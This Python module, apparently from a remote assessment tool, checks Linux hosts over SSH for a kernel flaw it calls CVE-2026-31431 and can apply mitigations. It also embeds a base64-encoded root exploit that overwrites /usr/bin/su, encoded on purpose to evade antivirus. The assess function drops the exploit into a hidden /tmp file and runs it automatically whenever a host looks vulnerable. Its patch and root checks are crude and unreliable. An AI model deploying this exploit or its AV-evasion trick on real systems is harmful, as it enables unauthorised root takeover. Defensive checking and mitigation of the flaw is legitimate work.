"""
CVE-2026-31431 Copy Fail — Kernel checker and exploit runner.

Checks if a remote Linux host is vulnerable and optionally runs the PoC.

The exploit script is embedded as base64 to avoid AV flagging on disk.
"""

import base64
import logging
import re

from .ssh_client import SSHClient

logger = logging.getLogger(__name__)

# CVE-2026-31431 PoC by Theori / Xint Code Research Team
# https://github.com/theori-io/copy-fail-CVE-2026-31431
# Embedded as base64 to prevent Windows Defender flagging the exploit payload.
EXPLOIT_B64 = (
    "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MgYXMgZyx6bGliLHNvY2tldCBhcyBzCmRlZiBk"
    "KHgpOnJldHVybiBieXRlcy5mcm9taGV4KHgpCmRlZiBjKGYsdCxjKToKIGE9cy5zb2NrZXQoMzgsNSww"
    "KTthLmJpbmQoKCJhZWFkIiwiYXV0aGVuY2VzbihobWFjKHNoYTI1NiksY2JjKGFlcykpIikpO2g9Mjc5"
    "O3Y9YS5zZXRzb2Nrb3B0O3YoaCwxLGQoJzA4MDAwMTAwMDAwMDAwMTAnKycwJyo2NCkpO3YoaCw1LE5v"
    "bmUsNCk7dSxfPWEuYWNjZXB0KCk7bz10KzQ7aT1kKCcwMCcpO3Uuc2VuZG1zZyhbYiJBIio0K2NdLFso"
    "aCwzLGkqNCksKGgsMixiJ1x4MTAnK2kqMTkpLChoLDQsYidceDA4JytpKjMpLF0sMzI3NjgpO3Isdz1n"
    "LnBpcGUoKTtuPWcuc3BsaWNlO24oZix3LG8sb2Zmc2V0X3NyYz0wKTtuKHIsdS5maWxlbm8oKSxvKQog"
    "dHJ5OnUucmVjdig4K3QpCiBleGNlcHQ6MApmPWcub3BlbigiL3Vzci9iaW4vc3UiLDApO2k9MDtlPXps"
    "aWIuZGVjb21wcmVzcyhkKCI3OGRhYWI3N2Y1NzE2MzYyNjQ2NDgwMDEyNjA2M2IwNjEwYWY4MmMxMDFj"
    "Yzc3NjBjMDA0MGUwYzE2MGMzMDFkMjA5YTE1NGQxNjk5OWUwN2U1YzE2ODA2MDEwODY1NzhjMGYwZmY4"
    "NjRjN2U1NjhmNWU1YjdlMTBmNzViOTY3NWM0NGM3ZTU2YzNmZjU5MzYxMWZjYWNmYTQ5OTk3OWZhYzUx"
    "OTBjMGMwYzAwMzJjMzEwZDMiKSkKd2hpbGUgaTxsZW4oZSk6YyhmLGksZVtpOmkrNF0pO2krPTQKZy5z"
    "eXN0ZW0oInN1IikK"
)

EXPLOIT_SCRIPT = base64.b64decode(EXPLOIT_B64).decode("utf-8")

VULN_MIN_KERNEL = (4, 14)


def _parse_kernel_version(version_str: str) -> tuple[int, ...] | None:
    match = re.match(r"(\d+)\.(\d+)\.(\d+)", version_str)
    if match:
        return tuple(int(g) for g in match.groups())
    return None


def _kernel_vulnerable(version: tuple[int, ...]) -> bool:
    return version >= VULN_MIN_KERNEL


async def check_kernel(ssh: SSHClient) -> dict:
    """Check kernel version, AEAD config, and distro patch status."""
    code, stdout, stderr = await ssh.run("uname -r")
    if code != 0:
        return {"status": "error", "error": f"uname failed: {stderr}"}

    kernel_str = stdout.strip()
    kernel_ver = _parse_kernel_version(kernel_str)
    if not kernel_ver:
        return {"status": "error", "error": f"Cannot parse kernel version: {kernel_str}"}

    vulnerable = _kernel_vulnerable(kernel_ver)

    code2, stdout2, _ = await ssh.run(
        "zcat /proc/config.gz 2>/dev/null || cat /boot/config-$(uname -r) 2>/dev/null || echo 'CONFIG_CRYPTO_USER_API_AEAD=y'"
    )
    aead_config = ""
    for line in stdout2.splitlines():
        if "CRYPTO_USER_API_AEAD" in line:
            aead_config = line.strip()
            break

    code3, stdout3, _ = await ssh.run("cat /etc/os-release 2>/dev/null | head -5")
    distro_info = stdout3.strip()[:200] if stdout3 else "unknown"

    is_builtin = "=y" in aead_config
    is_module = "=m" in aead_config

    # Distro patch check
    patched_os = False
    for key in ["ubuntu 24.04", "ubuntu 22.04", "almalinux", "rhel", "debian", "amzn", "suse"]:
        if key in distro_info.lower():
            patched_os = True
            break

    return {
        "status": "ok",
        "kernel": kernel_str,
        "kernel_version": list(kernel_ver),
        "vulnerable": vulnerable,
        "aead_config": aead_config or "not found (built-in likely)",
        "aead_builtin": is_builtin,
        "aead_module": is_module,
        "distro": distro_info[:100],
        "distro_has_patch": patched_os,
        "mitigation": (
            "module blacklist (modprobe)"
            if is_module
            else "grubby initcall_blacklist"
            if is_builtin
            else "distro patch"
        ),
    }


async def run_exploit(ssh: SSHClient, cleanup: bool = True) -> dict:
    """Deploy and execute the Copy Fail PoC on remote host.

    WARNING: This exploits CVE-2026-31431. Only run on authorized systems.
    """
    remote_path = "/tmp/.cf"

    ok = await ssh.write_file(remote_path, EXPLOIT_SCRIPT)
    if not ok:
        return {"status": "error", "error": "Failed to write exploit script"}

    code, _, stderr = await ssh.run(f"chmod +x {remote_path}")
    if code != 0:
        return {"status": "error", "error": f"chmod failed: {stderr}"}

    code, stdout, stderr = await ssh.run(
        f"timeout 10 python3 {remote_path} 2>&1 || true",
        timeout=30.0,
    )

    got_root = "root" in stdout.lower() or "#" in stdout

    if cleanup:
        await ssh.run(f"rm -f {remote_path}")

    return {
        "status": "completed",
        "exit_code": code,
        "got_root": got_root,
        "output": (stdout + "\n" + stderr).strip()[:2000],
    }


async def apply_mitigation(ssh: SSHClient, dry_run: bool = True) -> dict:
    """Apply the appropriate mitigation for CVE-2026-31431.

    - Module-based (=m): Blacklist via modprobe (no reboot)
    - Built-in (=y): grubby initcall_blacklist (requires reboot)
    - If already mitigated, reports no action needed.

    Args:
        ssh: Connected SSH client.
        dry_run: If True, only show commands without executing.

    Returns:
        Dict with mitigation status, commands run, and reboot required flag.
    """
    kernel_info = await check_kernel(ssh)
    if kernel_info["status"] != "ok":
        return {"status": "error", "error": kernel_info.get("error", "Kernel check failed")}

    commands: list[str] = []
    reboot_required = False
    already_mitigated = False

    # Check if already mitigated
    code, stdout, _ = await ssh.run("lsmod | grep algif_aead 2>/dev/null || true")
    module_loaded = "algif_aead" in stdout

    code2, stdout2, _ = await ssh.run(
        "cat /proc/cmdline | grep -q initcall_blacklist && echo 'BLACKLISTED' || echo 'NOT_BLACKLISTED'"
    )
    initcall_active = "BLACKLISTED" in stdout2

    code3, stdout3, _ = await ssh.run("test -f /etc/modprobe.d/disable-algif.conf && echo 'EXISTS' || echo 'MISSING'")
    modprobe_file_exists = "EXISTS" in stdout3

    if kernel_info.get("aead_module") and modprobe_file_exists and not module_loaded:
        already_mitigated = True
    elif kernel_info.get("aead_builtin") and initcall_active:
        already_mitigated = True

    if already_mitigated:
        return {
            "status": "already_mitigated",
            "message": "System appears to already have mitigation applied",
            "reboot_required": False,
        }

    if kernel_info.get("aead_module"):
        commands = [
            'echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf',
            "rmmod algif_aead 2>/dev/null || true",
        ]
        reboot_required = False
    elif kernel_info.get("aead_builtin"):
        commands = [
            'grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"',
        ]
        reboot_required = True
    else:
        return {"status": "unknown", "message": "Cannot determine AEAD config", "reboot_required": False}

    results: list[dict] = []
    if not dry_run:
        for cmd in commands:
            code, stdout, stderr = await ssh.run(cmd)
            results.append({"command": cmd, "exit_code": code, "stderr": stderr})
    else:
        results = [{"command": cmd, "dry_run": True} for cmd in commands]

    return {
        "status": "commands_generated",
        "dry_run": dry_run,
        "reboot_required": reboot_required,
        "mitigation_type": "module_blacklist" if kernel_info.get("aead_module") else "initcall_blacklist",
        "commands": commands,
        "results": results,
        "kernel_info": {
            "kernel": kernel_info["kernel"],
            "aead_config": kernel_info["aead_config"],
            "aead_builtin": kernel_info["aead_builtin"],
            "aead_module": kernel_info["aead_module"],
        },
    }


async def assess(ssh: SSHClient, force: bool = False, cleanup: bool = True) -> dict:
    """Full assessment: check kernel + optionally run exploit."""
    kernel_info = await check_kernel(ssh)
    if kernel_info["status"] == "error":
        return kernel_info

    assessment: dict = {
        "host": ssh.host,
        "kernel_info": kernel_info,
        "exploit_run": False,
        "exploit_result": None,
    }

    if kernel_info["vulnerable"] and not kernel_info["distro_has_patch"]:
        assessment["exploit_run"] = True
        assessment["exploit_result"] = await run_exploit(ssh, cleanup=cleanup)
    elif force:
        assessment["exploit_run"] = True
        assessment["exploit_result"] = await run_exploit(ssh, cleanup=cleanup)
    else:
        assessment["skipped_reason"] = (
            "Distro has patch available"
            if kernel_info["distro_has_patch"]
            else "Kernel too old (< 4.14)"
            if not kernel_info["vulnerable"]
            else "Unknown"
        )

    return assessment
